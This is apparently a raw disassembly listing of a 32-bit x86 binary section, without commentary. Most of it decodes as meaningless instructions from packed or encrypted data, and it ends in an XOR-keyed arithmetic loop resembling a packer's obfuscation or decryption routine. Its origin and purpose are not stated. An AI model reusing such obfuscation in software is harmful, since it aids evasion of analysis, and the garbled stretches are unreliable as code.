  415d82:	ins    BYTE PTR es:[edi],dx
  415d83:	inc    edi
  415d84:	mov    ds:0xd35e512c,eax
  415d89:	mov    al,0xc
  415d8b:	pop    esp
  415d8c:	jp     0x415e03
  415d8e:	push   es
  415d8f:	int3   
  415d90:	push   edx
  415d91:	push   ss
  415d92:	sbb    al,0xf6
  415d94:	and    ah,BYTE PTR [edx-0x1e]
  415d97:	call   0x76440605
  415d9c:	add    DWORD PTR [eax-0x2a],ebp
  415d9f:	ds retf 
  415da1:	icebp  
  415da2:	sahf   
  415da3:	pushf  
  415da4:	dec    edi
  415da5:	xchg   ch,ch
  415da7:	inc    ebp
  415da8:	sbb    bh,BYTE PTR [eax]
  415daa:	mov    bl,al
  415dac:	inc    esp
  415dad:	mov    BYTE PTR [edx+0x75],bl
  415db0:	jmp    0x9888:0xa03d86d2
  415db7:	add    eax,0x6789d961
  415dbc:	add    al,0x81
  415dbe:	mov    eax,ds:0xfab7e39b
  415dc3:	loopne 0x415dfd
  415dc5:	in     eax,0x30
  415dc7:	add    al,0x6
  415dc9:	clc    
  415dca:	nop
  415dcb:	mov    ah,BYTE PTR [ecx-0x4]
  415dce:	push   cs
  415dcf:	dec    ebx
  415dd0:	pop    ds
  415dd1:	pop    esi
  415dd2:	jecxz  0x415db3
  415dd4:	mov    fs,esp
  415dd6:	ins    BYTE PTR es:[edi],dx
  415dd7:	inc    esp
  415dd8:	mov    edi,0x352ebe74
  415ddd:	(bad)  
  415dde:	dec    DWORD PTR [eax+ebp*4-0x2a]
  415de2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415de3:	or     BYTE PTR [eax-0x43343f2c],0xe1
  415dea:	int3   
  415deb:	mov    ?,WORD PTR ds:0x6a4d0829
  415df1:	loopne 0x415dfe
  415df3:	push   cs
  415df4:	cmp    DWORD PTR [edi],ebp
  415df6:	int3   
  415df7:	call   0x737fe766
  415dfc:	pop    edx
  415dfd:	repnz into 
  415dff:	and    eax,0x31bf94a3
  415e04:	inc    ebp
  415e05:	fistp  QWORD PTR [edx-0x48]
  415e08:	push   ecx
  415e09:	push   edi
  415e0a:	xchg   ebx,eax
  415e0b:	push   esi
  415e0c:	call   DWORD PTR [edx+0x112c6331]
  415e12:	sbb    al,0x0
  415e14:	add    al,0xbc
  415e16:	sub    esi,edi
  415e18:	adc    bl,BYTE PTR [ebp-0x1d642f0f]
  415e1e:	add    BYTE PTR [eax],0xae
  415e21:	sub    eax,0x331a0fad
  415e26:	xchg   edx,ebx
  415e28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e29:	sub    ah,BYTE PTR [edi+0x460ed22c]
  415e2f:	aas    
  415e30:	aas    
  415e31:	mov    DWORD PTR [ebx+0x57],ebp
  415e34:	into   
  415e35:	push   cx
  415e37:	stos   DWORD PTR es:[edi],eax
  415e38:	pop    edx
  415e39:	push   ecx
  415e3a:	scas   al,BYTE PTR es:[edi]
  415e3b:	stc    
  415e3c:	xchg   esp,eax
  415e3d:	inc    esp
  415e3e:	push   ss
  415e3f:	xchg   BYTE PTR [ebp+0x72308488],ah
  415e45:	mov    dh,0xe6
  415e47:	adc    eax,0xe23cde90
  415e4c:	jmp    0x4750:0x8b2964ea
  415e53:	add    bh,ah
  415e55:	fisub  DWORD PTR [ebp-0x6358bc1d]
  415e5b:	xchg   edi,eax
  415e5d:	adc    edx,DWORD PTR [ebx]
  415e5f:	in     al,0xf0
  415e61:	jl     0x415e1a
  415e63:	fsub   DWORD PTR [ecx]
  415e65:	fs dec esp
  415e67:	(bad)  
  415e68:	jmp    0x415ed7
  415e6a:	dec    edi
  415e6b:	call   0xc6aab1d9
  415e70:	dec    edx
  415e71:	mov    al,ds:0x91f0dcf8
  415e76:	push   eax
  415e77:	loop   0x415e21
  415e79:	xor    esi,DWORD PTR [ecx]
  415e7b:	push   ss
  415e7c:	sub    bl,dl
  415e7e:	adc    ch,BYTE PTR [ebp+0x415dc249]
  415e84:	inc    edi
  415e85:	xor    bl,0xc4
  415e88:	xor    DWORD PTR [edi-0x3a],ebp
  415e8b:	push   0xd9483673
  415e90:	int3   
  415e91:	jb     0x415e3f
  415e93:	cmp    eax,0x90c67382
  415e98:	retf   
  415e99:	xor    DWORD PTR [ebx+0x6c],0xa708e98a
  415ea0:	mov    bl,0xe9
  415ea2:	repnz push ss
  415ea4:	jne    0x415e4e
  415ea6:	and    esp,edi
  415ea8:	dec    edx
  415ea9:	and    eax,0xb80b8d8c
  415eae:	sar    eax,0x2e
  415eb1:	add    al,0x0
  415eb3:	cmp    eax,0x4b53dd7
  415eb8:	sbb    al,0x40
  415eba:	rcr    edi,0x2f
  415ebd:	nop
  415ebe:	jbe    0x415ef8
  415ec0:	push   cs
  415ec1:	sub    eax,0x791b9af2
  415ec6:	rol    BYTE PTR ds:0xbdb6758,0x1e
  415ecd:	mov    ebx,?
  415ecf:	add    ah,BYTE PTR [esi+0x52]
  415ed2:	(bad)  
  415ed4:	fiadd  WORD PTR [ecx]
  415ed6:	sti    
  415ed7:	pushf  
  415ed8:	jmp    FWORD PTR [edi-0x1a]
  415edb:	jb     0x415ecc
  415edd:	out    0xbf,eax
  415edf:	pop    edi
  415ee0:	ror    ebx,0x47
  415ee3:	xchg   edx,eax
  415ee4:	inc    ecx
  415ee5:	mov    gs,WORD PTR [edi]
  415ee7:	(bad)  
  415ee9:	push   0x55f40343
  415eee:	and    esp,DWORD PTR [ecx-0x4a74a0fe]
  415ef4:	dec    edx
  415ef5:	sahf   
  415ef6:	popa   
  415ef7:	repz xchg ebp,eax
  415ef9:	aas    
  415efa:	add    ch,bh
  415efc:	xchg   ecx,eax
  415efd:	rol    BYTE PTR [esi-0x1dfaa653],cl
  415f03:	inc    ebx
  415f04:	jne    0x415ead
  415f06:	scas   eax,DWORD PTR es:[edi]
  415f07:	std    
  415f08:	mov    dl,0xd5
  415f0a:	xchg   ebx,eax
  415f0b:	pusha  
  415f0c:	add    DWORD PTR [edi+0x3c4a1a3f],esp
  415f12:	cwde   
  415f13:	ret    0xbe24
  415f16:	lahf   
  415f17:	adc    al,0xe
  415f19:	scas   eax,DWORD PTR es:[edi]
  415f1a:	push   esi
  415f1b:	(bad)  
  415f1c:	icebp  
  415f1d:	push   ebp
  415f1e:	iret   
  415f1f:	je     0x415f9f
  415f21:	ret    0x39ef
  415f24:	or     DWORD PTR [ebp-0x2e],esp
  415f27:	inc    esi
  415f28:	fst    DWORD PTR [edx+0x8]
  415f2b:	les    ebx,FWORD PTR [esi-0x1b]
  415f2e:	int    0xfe
  415f30:	lods   eax,DWORD PTR ds:[esi]
  415f31:	sbb    al,0x5a
  415f33:	adc    esp,DWORD PTR [edi+0x19]
  415f36:	and    DWORD PTR [esi-0x4c],ecx
  415f39:	pop    ecx
  415f3a:	jl     0x415fa2
  415f3c:	adc    dl,0x57
  415f3f:	or     esp,DWORD PTR [esi-0x33]
  415f42:	fidivr DWORD PTR [ebp-0x59e5c446]
  415f48:	pop    ds
  415f49:	and    DWORD PTR [eax+0x2a],esi
  415f4c:	inc    edx
  415f4d:	in     al,dx
  415f4e:	push   esp
  415f4f:	mov    ds:0xed042b45,al
  415f54:	bound  esi,QWORD PTR ds:0x1d525b4
  415f5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f5b:	or     eax,0x85314d44
  415f60:	push   0xffffff93
  415f62:	add    BYTE PTR [esi-0xb],0x76
  415f66:	adc    al,0xec
  415f68:	popa   
  415f69:	add    ah,BYTE PTR [ebx-0x3ea7e323]
  415f6f:	mov    ebp,0x22ca84aa
  415f74:	(bad)  
  415f75:	push   ds
  415f76:	xor    ebp,DWORD PTR [esi-0xd4f60b8]
  415f7c:	(bad)
  415f80:	loopne 0x415fcc
  415f82:	popf   
  415f83:	(bad)  
  415f84:	int    0x81
  415f86:	xor    cl,BYTE PTR [esi+0x3e]
  415f89:	daa    
  415f8a:	(bad)  
  415f8c:	call   0x30b9d0ec
  415f91:	ja     0x415f8c
  415f93:	pop    esp
  415f94:	dec    edx
  415f95:	add    eax,0x3011a5d4
  415f9a:	shl    DWORD PTR [edi],1
  415f9c:	stc    
  415f9d:	mov    ch,0xd2
  415f9f:	fadd   QWORD PTR [ecx-0x29847eb]
  415fa5:	pusha  
  415fa6:	sbb    BYTE PTR [edx+ecx*8+0x6a378e42],dh
  415fad:	mov    ebx,0x378bb4e0
  415fb2:	sbb    eax,DWORD PTR [esi]
  415fb4:	cs loopne 0x415ff6
  415fb7:	adc    al,0xc8
  415fb9:	mov    ch,BYTE PTR [ebx+0xe8da4ff]
  415fbf:	xchg   edx,eax
  415fc0:	add    edi,0xf442dafc
  415fc6:	xlat   BYTE PTR ds:[ebx]
  415fc7:	pop    ecx
  415fc8:	xchg   esp,eax
  415fc9:	pop    eax
  415fca:	jg     0x415fdd
  415fcc:	in     al,0x7f
  415fce:	pop    ss
  415fcf:	mov    al,ds:0xf9a743ae
  415fd4:	mov    ebx,0xdd13a37e
  415fd9:	mov    dh,BYTE PTR [ecx]
  415fdb:	mov    cl,0xac
  415fdd:	movmskps eax,xmm3
  415fe0:	xchg   DWORD PTR [ebx+eax*4-0xb94fb3a],edx
  415fe7:	pushf  
  415fe8:	mov    esi,0x3c338284
  415fed:	cli    
  415fee:	xchg   bl,bh
  415ff0:	and    bh,BYTE PTR [eax-0x1973a5ce]
  415ff6:	(bad)
  415ff9:	jp     0x416006
  415ffb:	pop    esp
  415ffc:	call   DWORD PTR [esi+0x41]
  415fff:	mov    edi,0x6c9bfa9d
  416004:	or     al,0x84
  416006:	cmp    eax,0xd65d8f8
  41600b:	mov    eax,0x1a9f14a2
  416010:	add    ah,ah
  416012:	(bad)  
  416013:	fisttp WORD PTR [edx+0x7886a2e0]
  416019:	popf   
  41601a:	out    0x23,al
  41601c:	in     eax,0x47
  41601e:	test   BYTE PTR [edi+0x56],0x57
  416022:	push   eax
  416023:	cmp    al,0xa5
  416025:	loope  0x4160a4
  416027:	inc    ecx
  416028:	stos   BYTE PTR es:[edi],al
  416029:	ds inc edi
  41602b:	sub    al,0xd7
  41602d:	shr    BYTE PTR [esi+0x42d3765a],0x78
  416034:	push   cs
  416035:	inc    esp
  416036:	popf   
  416037:	dec    ecx
  416038:	lods   al,BYTE PTR ds:[esi]
  416039:	xchg   esp,eax
  41603a:	ret    0xe94c
  41603d:	xchg   dl,cl
  41603f:	push   esp
  416040:	pop    es
  416041:	or     esi,DWORD PTR [ebx-0x13]
  416044:	xchg   edi,eax
  416045:	xor    eax,0x27cf82af
  41604a:	js     0x416011
  41604c:	fs push es
  41604e:	jbe    0x416014
  416050:	lods   eax,DWORD PTR ds:[esi]
  416051:	fnstsw WORD PTR [esi+0x61]
  416054:	cwde   
  416055:	xchg   ecx,eax
  416056:	pop    eax
  416057:	sbb    al,0x85
  416059:	mov    WORD PTR [edi-0x62],?
  41605c:	gs stc 
  41605e:	out    dx,al
  41605f:	(bad)  
  416060:	cdq    
  416061:	shl    al,cl
  416063:	xor    al,0xd4
  416065:	and    eax,0xd5fe6773
  41606a:	jnp    0x416042
  41606c:	cld    
  41606d:	mov    eax,ds:0xe98b9d31
  416072:	sbb    bh,al
  416074:	xor    esp,DWORD PTR [esi-0x39]
  416077:	outs   dx,BYTE PTR ds:[esi]
  416078:	or     dl,BYTE PTR [eax+0x60]
  41607b:	xchg   esp,eax
  41607c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41607d:	sub    ch,ah
  41607f:	sub    edi,edx
  416081:	sub    BYTE PTR [esi+0x5d81569c],bl
  416087:	cmc    
  416088:	mov    bh,0x98
  41608a:	fs jl  0x416016
  41608d:	mov    bh,ah
  41608f:	fistp  DWORD PTR ds:0x3adf082
  416095:	js     0x416111
  416097:	or     eax,0x34a6ffc0
  41609c:	inc    esi
  41609d:	(bad)  
  41609e:	(bad)  
  41609f:	cld    
  4160a0:	xchg   DWORD PTR [eax+0x3c],esi
  4160a3:	loop   0x416107
  4160a5:	mov    bl,BYTE PTR [ecx]
  4160a7:	retf   0x4dcf
  4160aa:	out    0xc2,al
  4160ac:	imul   ebp,DWORD PTR [eax-0x388efcc9],0xffffffce
  4160b3:	fild   DWORD PTR [eax]
  4160b5:	pop    eax
  4160b6:	jg     0x416124
  4160b8:	pop    eax
  4160b9:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160bb:	jecxz  0x4160cd
  4160bd:	pushf  
  4160be:	xchg   ecx,eax
  4160bf:	pushf  
  4160c0:	pop    ebx
  4160c1:	push   eax
  4160c2:	shr    DWORD PTR [eax-0x5cd2694b],0xc5
  4160c9:	or     BYTE PTR [eax-0x6184964b],dl
  4160cf:	data16 ins BYTE PTR es:[edi],dx
  4160d1:	mov    cl,0xd8
  4160d3:	xor    ebx,ebp
  4160d5:	mov    esi,0xefef6200
  4160da:	test   eax,0x43a6dfb
  4160df:	aas    
  4160e0:	int    0xff
  4160e2:	or     DWORD PTR [edi],eax
  4160e4:	leave  
  4160e5:	mov    edi,0x149c709b
  4160ea:	retf   
  4160eb:	xchg   BYTE PTR [eax+0x2c],bl
  4160ee:	and    DWORD PTR [esi],edi
  4160f0:	cwde   
  4160f1:	sbb    BYTE PTR [edx+0x211662c],al
  4160f7:	add    esi,edx
  4160f9:	sti    
  4160fa:	addr16 inc ecx
  4160fc:	call   0x4dd6:0x37bfe32e
  416103:	mov    esp,0xe42f7c1e
  416108:	xchg   ebx,eax
  416109:	pop    esp
  41610a:	mov    bl,BYTE PTR [ebp-0x3b]
  41610d:	inc    ebx
  41610e:	in     al,0x0
  416110:	rol    DWORD PTR [ecx-0x74],1
  416113:	inc    eax
  416114:	inc    ebx
  416115:	test   BYTE PTR [ebx+edx*2-0x17],cl
  416119:	in     eax,0x2c
  41611b:	dec    esp
  41611c:	in     al,0xd8
  41611e:	inc    esp
  41611f:	sbb    eax,0x396ebbaf
  416124:	or     dl,BYTE PTR [edi]
  416126:	mov    edx,DWORD PTR [esi+edi*8-0x5ef0ac7a]
  41612d:	stos   BYTE PTR es:[edi],al
  41612e:	cli    
  41612f:	leave  
  416130:	mov    ah,0xf6
  416132:	jmp    0xb43f:0x3b0b2f4
  416139:	fld    st(7)
  41613b:	mov    WORD PTR [esi-0x6e],?
  41613e:	push   es
  41613f:	iret   
  416140:	out    0x2c,eax
  416142:	ja     0x41618f
  416144:	cmp    DWORD PTR [ebp-0x4d],ebp
  416147:	fcom   DWORD PTR [ecx+0x51]
  41614a:	cmpxchg DWORD PTR [ebx+esi*4],ecx
  41614e:	sahf   
  41614f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416150:	shr    DWORD PTR fs:[ebp-0x7da68152],cl
  416157:	ins    DWORD PTR es:[edi],dx
  416158:	(bad)  
  416159:	fwait
  41615a:	pop    edi
  41615b:	mov    al,0xac
  41615d:	fwait
  41615e:	adc    BYTE PTR [edi],ah
  416160:	frstor [esi]
  416162:	pop    es
  416163:	lods   al,BYTE PTR ds:[esi]
  416164:	(bad)  
  416165:	sbb    cl,BYTE PTR [ebp-0x6]
  416168:	fbstp  TBYTE PTR [eax-0x75]
  41616b:	ja     0x41614a
  41616d:	fistp  WORD PTR [edi-0x13]
  416170:	int3   
  416171:	adc    DWORD PTR [ebx+0x47fe67df],esi
  416177:	cmc    
  416178:	xchg   esi,eax
  416179:	in     eax,dx
  41617a:	xor    BYTE PTR [eax+0x5c],al
  41617d:	dec    eax
  41617f:	ins    BYTE PTR es:[edi],dx
  416180:	jno    0x41611d
  416182:	ret    0x5c13
  416185:	mov    eax,0xa3098e07
  41618a:	jmp    0xac59d604
  41618f:	int3   
  416190:	and    al,0x69
  416192:	sbb    DWORD PTR [eax],0x1921b47a
  416198:	adc    edx,DWORD PTR [esi]
  41619a:	lea    ebx,[ebx+0x46]
  41619d:	pop    eax
  41619e:	jae    0x41620a
  4161a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161a1:	lds    esp,FWORD PTR [esi+0x5d]
  4161a4:	cld    
  4161a5:	fistp  QWORD PTR ds:0x6b152c08
  4161ab:	loopne 0x4161a0
  4161ad:	rcr    BYTE PTR [eax-0x5c],0xf1
  4161b1:	mov    al,0x58
  4161b3:	add    dl,BYTE PTR [eax]
  4161b5:	(bad)  
  4161b6:	fisubr WORD PTR [ebx-0x4d]
  4161b9:	xchg   edx,eax
  4161ba:	dec    edi
  4161bb:	jo     0x416209
  4161bd:	jnp    0x4161df
  4161bf:	into   
  4161c0:	and    BYTE PTR [ecx+0x5a],ch
  4161c3:	out    dx,eax
  4161c4:	stc    
  4161c5:	jns    0x416217
  4161c7:	ins    DWORD PTR es:[edi],dx
  4161c8:	outs   dx,BYTE PTR ds:[esi]
  4161c9:	adc    edx,DWORD PTR [esi+eax*8+0x42]
  4161cd:	xor    DWORD PTR [esp+eiz*8-0x6eb3140c],edx
  4161d4:	mov    ecx,DWORD PTR [edi]
  4161d6:	std    
  4161d7:	loopne 0x4161c8
  4161d9:	retf   
  4161da:	shl    DWORD PTR [ecx+eax*1-0x46],cl
  4161de:	pop    edx
  4161df:	adc    DWORD PTR [edx],ebx
  4161e1:	ins    BYTE PTR es:[edi],dx
  4161e2:	pop    ecx
  4161e3:	stc    
  4161e4:	push   edx
  4161e5:	add    eax,0xb72100fe
  4161ea:	out    0xe3,al
  4161ec:	fwait
  4161ed:	outs   dx,DWORD PTR ds:[esi]
  4161ee:	pop    ebp
  4161ef:	mov    bl,0x97
  4161f1:	push   edi
  4161f2:	jle    0x4161a0
  4161f4:	mov    al,ds:0x22240375
  4161f9:	cld    
  4161fa:	lahf   
  4161fb:	out    dx,eax
  4161fc:	mov    eax,0xed82a8c3
  416201:	dec    edx
  416202:	jb     0x416217
  416204:	icebp  
  416205:	retf   
  416206:	scas   al,BYTE PTR es:[edi]
  416207:	xor    DWORD PTR [ecx+ebp*2],0x9
  41620b:	test   DWORD PTR [ebp+esi*1+0x47514bb8],esp
  416212:	mov    ch,0xb0
  416214:	inc    edi
  416215:	pop    ss
  416216:	mov    ds:0xfb93951a,al
  41621b:	nop
  41621c:	mov    bh,BYTE PTR [eax-0x4]
  41621f:	sar    BYTE PTR [esi+0x40],0xb9
  416223:	das    
  416224:	in     eax,0xe0
  416226:	jae    0x4161f6
  416228:	(bad)  
  416229:	int3   
  41622a:	push   ss
  41622b:	xor    eax,eax
  41622d:	cmc    
  41622e:	(bad)
  416231:	adc    ebx,DWORD PTR [esp+ebp*8]
  416234:	dec    esi
  416235:	push   ebx
  416236:	mov    ds:0xde154450,al
  41623b:	outs   dx,BYTE PTR ds:[esi]
  41623c:	jo     0x416264
  41623e:	mov    ds:0x464c95e4,eax
  416243:	rol    edx,1
  416245:	sub    dh,dh
  416247:	lds    ebx,FWORD PTR [eax+ebx*1]
  41624a:	fiadd  DWORD PTR [ebp+0x141a6d31]
  416250:	mov    bl,BYTE PTR ds:0xdcc9fa8e
  416256:	mov    dh,0xfc
  416258:	lods   eax,DWORD PTR ds:[esi]
  416259:	mul    bl
  41625b:	enter  0x5442,0xc3
  41625f:	or     eax,0xd88a45bb
  416264:	sar    BYTE PTR [eax],cl
  416266:	icebp  
  416267:	ficomp WORD PTR [esi]
  416269:	mov    edx,0xb867aae6
  41626e:	adc    DWORD PTR ds:0xd622bc38,ecx
  416274:	arpl   WORD PTR [edi],si
  416276:	mov    al,ds:0xfbefc516
  41627b:	sub    DWORD PTR [ebp-0x351bc194],ebx
  416281:	xchg   ecx,eax
  416282:	mov    al,ds:0x4203e7d1
  416287:	cs mov edx,0xb5554e30
  41628d:	xchg   BYTE PTR [ebx+0x26],dh
  416290:	ins    BYTE PTR es:[edi],dx
  416291:	cmp    DWORD PTR [edx+0x10],0xffffff89
  416295:	mov    al,0xf9
  416297:	cs jnp 0x416221
  41629a:	gs inc edx
  41629c:	stos   DWORD PTR es:[edi],eax
  41629d:	ss mov ?,edi
  4162a0:	ins    BYTE PTR es:[edi],dx
  4162a1:	test   ecx,0x9e103936
  4162a7:	and    al,0xa1
  4162a9:	xchg   ebx,eax
  4162aa:	ret    0xc287
  4162ad:	mov    ch,0xfa
  4162af:	jl     0x416274
  4162b1:	enter  0xe40f,0x40
  4162b5:	inc    edx
  4162b6:	push   ds
  4162b7:	push   cs
  4162b8:	inc    edx
  4162b9:	retf   0x9ded
  4162bc:	xor    al,0x50
  4162be:	int    0x11
  4162c0:	pop    ebx
  4162c1:	test   DWORD PTR [ecx-0x46],ebx
  4162c4:	loopne 0x41627b
  4162c6:	inc    edx
  4162c7:	lock call 0xad13:0x3cda4fa0
  4162cf:	push   ds
  4162d0:	(bad)  
  4162d1:	sbb    al,bh
  4162d3:	push   es
  4162d4:	mov    dh,0xb
  4162d6:	xor    ah,BYTE PTR [ecx-0x456d9d55]
  4162dc:	mov    BYTE PTR gs:0x76d01585,ah
  4162e3:	lods   eax,DWORD PTR ds:[esi]
  4162e4:	pop    ecx
  4162e5:	lock mov bh,0x2
  4162e8:	inc    edi
  4162e9:	add    DWORD PTR [ebp+0x3f],esi
  4162ec:	arpl   WORD PTR [edi+0x66],bx
  4162ef:	in     al,0x24
  4162f1:	scas   eax,DWORD PTR es:[edi]
  4162f2:	mov    edx,0x1fbf8c1d
  4162f7:	fwait
  4162f8:	xchg   DWORD PTR [edx+eax*8+0x5fc61d28],esp
  4162ff:	(bad)  
  416300:	cmp    bl,BYTE PTR [ecx-0x20a6e30f]
  416306:	xor    DWORD PTR [eax],0x2a185665
  41630c:	jo     0x4162ca
  41630e:	shl    BYTE PTR [esi],0x67
  416311:	icebp  
  416312:	mov    eax,0xe1ac194d
  416317:	dec    ebp
  416318:	sbb    eax,0x5f6b9b53
  41631d:	dec    eax
  41631e:	pusha  
  41631f:	cmp    DWORD PTR [edi-0x188003d5],0xd1e1fae
  416329:	pop    es
  41632a:	jnp    0x4162e9
  41632c:	ret    0x1a64
  41632f:	pop    edi
  416330:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416331:	cmp    eax,0x22388d77
  416336:	dec    ebx
  416337:	dec    esp
  416338:	cs std 
  41633a:	into   
  41633b:	sub    al,0xc0
  41633d:	inc    edx
  41633e:	or     al,0x81
  416340:	mov    ?,WORD PTR [edi+0x7f22c89d]
  416346:	sub    ebx,DWORD PTR [ebp+0x573152f]
  41634c:	push   ebx
  41634d:	sahf   
  41634e:	xchg   esp,eax
  41634f:	jmp    0x3dfe:0x5edde26e
  416356:	mov    dh,0xf
  416358:	ret    
  416359:	rcr    BYTE PTR [eax],cl
  41635b:	adc    BYTE PTR [ecx-0x679ad4dd],ch
  416361:	mov    edx,0xe5ed3f3e
  416366:	jmp    0xbcdd:0xda622821
  41636d:	jp     0x41632a
  41636f:	sbb    al,0x31
  416371:	xchg   BYTE PTR [ecx],ch
  416373:	leave  
  416374:	les    ecx,FWORD PTR [edi-0x4ff05f95]
  41637a:	arpl   WORD PTR [ecx-0x731d83c3],si
  416380:	(bad)  
  416381:	cmp    eax,0xb588faee
  416386:	aam    0xe0
  416388:	jl     0x4163dd
  41638a:	in     al,0xb7
  41638c:	mov    ah,0x64
  41638e:	stos   DWORD PTR es:[edi],eax
  41638f:	retf   
  416390:	dec    ebp
  416391:	cwde   
  416392:	out    dx,eax
  416393:	test   al,al
  416395:	sbb    dl,BYTE PTR [esi+0x76]
  416398:	pusha  
  416399:	jbe    0x41637a
  41639b:	cmp    BYTE PTR [ebx+0x6104a979],cl
  4163a1:	push   edi
  4163a2:	mov    al,0x87
  4163a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163a5:	lods   al,BYTE PTR ds:[esi]
  4163a6:	cmp    ecx,eax
  4163a8:	inc    ecx
  4163a9:	es xchg ecx,eax
  4163ab:	mov    esi,0xf506ec61
  4163b0:	inc    eax
  4163b1:	dec    DWORD PTR [bp+si+0x1b]
  4163b5:	retf   
  4163b6:	sub    ebx,edx
  4163b8:	add    ebx,DWORD PTR [ebp-0x44]
  4163bb:	mov    DWORD PTR [ebp-0x44],ebx
  4163be:	mov    edx,DWORD PTR [ebp+0x8]
  4163c1:	xor    edx,eax
  4163c3:	add    edx,esi
  4163c5:	jne    0x413f9a
  4163cb:	mov    edx,DWORD PTR [ebp-0x8]
  4163ce:	mov    ebx,DWORD PTR [ebp-0xc]
  4163d1:	xor    edx,eax
  4163d3:	lea    edx,[edx+ebx*1+0x3272e2]
  4163da:	mov    DWORD PTR [ebp-0xc],edx
  4163dd:	mov    edx,DWORD PTR [ebp-0x10]
  4163e0:	xor    edx,eax
  4163e2:	add    edx,esi
  4163e4:	jne    0x40f3d9
  4163ea:	jmp    0x416501
  4163ef:	mov    ecx,DWORD PTR [ebp-0x14]
  4163f2:	mov    DWORD PTR [ebp+0x8],ecx
  4163f5:	jmp    0x41646e
  4163fa:	mov    ecx,DWORD PTR [ebp+0x8]
  4163fd:	mov    edx,DWORD PTR [ebp-0x8]
  416400:	xor    ecx,eax
  416402:	xor    edx,eax
  416404:	sub    ecx,edx
  416406:	sub    ecx,esi
  416408:	xor    ecx,eax
  41640a:	mov    DWORD PTR [ebp+0x8],ecx
  41640d:	mov    ecx,DWORD PTR [ebp+0x8]
  416410:	mov    edx,DWORD PTR [ebp-0x58]
  416413:	add    ecx,0x5708c4
  416419:	imul   ecx,edx
  41641c:	mov    DWORD PTR [ebp-0x58],ecx
  41641f:	mov    ecx,DWORD PTR [ebp+0x8]
  416422:	mov    edx,DWORD PTR [ebp-0x54]
  416425:	add    ecx,0x64f8da
  41642b:	or     ecx,edx
  41642d:	mov    DWORD PTR [ebp-0x54],ecx
  416430:	mov    ecx,DWORD PTR [ebp+0x8]
  416433:	mov    edx,DWORD PTR [ebp-0x50]
  416436:	add    ecx,0x242ebe9
  41643c:	xor    ecx,edx
  41643e:	mov    DWORD PTR [ebp-0x50],ecx
  416441:	mov    ecx,DWORD PTR [ebp+0x8]
  416444:	mov    edx,DWORD PTR [ebp-0x4c]
  416447:	add    ecx,edi
  416449:	and    ecx,edx
  41644b:	mov    DWORD PTR [ebp-0x4c],ecx
  41644e:	mov    ecx,DWORD PTR [ebp+0x8]
  416451:	mov    edx,DWORD PTR [ebp-0x48]
  416454:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41645b:	mov    DWORD PTR [ebp-0x48],ecx
  41645e:	mov    ecx,DWORD PTR [ebp+0x8]
  416461:	mov    edx,0xfa5e15e2
  416466:	sub    edx,ecx
  416468:	add    edx,DWORD PTR [ebp-0x44]
  41646b:	mov    DWORD PTR [ebp-0x44],edx
  41646e:	mov    ecx,DWORD PTR [ebp+0x8]
  416471:	xor    ecx,eax
  416473:	add    ecx,esi
  416475:	jne    0x4163fa
  41647b:	jmp    0x41650d
  416480:	mov    ecx,DWORD PTR [ebp+0x8]
  416483:	mov    edx,DWORD PTR [ebp-0x8]
  416486:	xor    ecx,eax
  416488:	xor    edx,eax
  41648a:	sub    ecx,edx
  41648c:	sub    ecx,esi
  41648e:	xor    ecx,eax
  416490:	mov    DWORD PTR [ebp+0x8],ecx
  416493:	mov    ecx,DWORD PTR [ebp+0x8]
  416496:	mov    edx,DWORD PTR [ebp-0x58]
  416499:	add    ecx,0x5708c4
  41649f:	imul   ecx,edx
  4164a2:	mov    DWORD PTR [ebp-0x58],ecx
  4164a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4164a8:	mov    edx,DWORD PTR [ebp-0x54]
  4164ab:	add    ecx,0x64f8da
  4164b1:	or     ecx,edx
  4164b3:	mov    DWORD PTR [ebp-0x54],ecx
  4164b6:	mov    ecx,DWORD PTR [ebp+0x8]
  4164b9:	mov    edx,DWORD PTR [ebp-0x50]
  4164bc:	add    ecx,0x242ebe9
  4164c2:	xor    ecx,edx
  4164c4:	mov    DWORD PTR [ebp-0x50],ecx
  4164c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4164ca:	mov    edx,DWORD PTR [ebp-0x4c]
  4164cd:	add    ecx,edi
  4164cf:	and    ecx,edx
  4164d1:	mov    DWORD PTR [ebp-0x4c],ecx
  4164d4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164d7:	mov    edx,DWORD PTR [ebp-0x48]
  4164da:	lea    ecx,[edx+ecx*1+0x241fc1f]
  4164e1:	mov    DWORD PTR [ebp-0x48],ecx
  4164e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164e7:	mov    edx,0xfa5e15e2
  4164ec:	sub    edx,ecx
  4164ee:	add    edx,DWORD PTR [ebp-0x44]
  4164f1:	mov    DWORD PTR [ebp-0x44],edx
  4164f4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164f7:	xor    ecx,eax
  4164f9:	add    ecx,esi
  4164fb:	jne    0x416480
  416501:	mov    ecx,DWORD PTR [ebp-0x8]
  416504:	xor    ecx,eax
  416506:	mov    eax,DWORD PTR [ebp+0x10]
  416509:	add    ecx,esi
  41650b:	mov    DWORD PTR [eax],ecx
  41650d:	pop    edi
  41650e:	pop    esi
  41650f:	pop    ebx
  416510:	leave  
  416511:	ret    0xc
  416514:	add    BYTE PTR [eax+0x43],al
  416517:	add    BYTE PTR [eax+eax*2],al
  41651a:	inc    ebx
  41651b:	add    BYTE PTR [eax],cl
  41651d:	inc    eax
  41651e:	inc    ebx
  41651f:	add    BYTE PTR [eax+eax*2],cl
  416522:	inc    ebx
  416523:	add    BYTE PTR [eax],dl
  416525:	inc    eax
  416526:	inc    ebx
  416527:	add    BYTE PTR [eax+eax*2],dl
  41652a:	inc    ebx
  41652b:	add    BYTE PTR [eax],bl
  41652d:	inc    eax
  41652e:	inc    ebx
  41652f:	add    BYTE PTR [eax+eax*2],bl
  416532:	inc    ebx
  416533:	add    BYTE PTR [eax],ah
  416535:	inc    eax
  416536:	inc    ebx
